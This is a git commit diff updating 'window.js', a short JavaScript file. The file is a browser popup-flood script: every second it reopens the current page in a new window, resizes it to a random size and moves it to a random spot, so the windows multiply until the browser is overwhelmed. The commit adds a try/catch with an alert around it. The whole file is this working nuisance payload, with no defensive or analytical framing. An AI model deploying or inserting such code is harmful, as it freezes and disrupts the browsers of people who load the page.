985cfc557211be26ddd14ab95cdc6bc3caadbf17
ChessAITest <147644008+ChessAITest@users.noreply.github.com>
2024-01-24 09:25:01 -0500

    Update window.js

--- window.js
+++ window.js
@@ -1,8 +1,12 @@
+try{
 var win;
 setTimeout(function(){
 setInterval(function(){
-win = window.open(location.href);
+win = window.open(location.href, "", "");
 win.resizeTo(Math.random() * screen.width, Math.random() * screen.height);
 win.moveTo(Math.random() * screen.width, Math.random() * screen.height);
 }, 1000);
 }, 1000);
+} catch(e){
+  alert(e.message);
+}
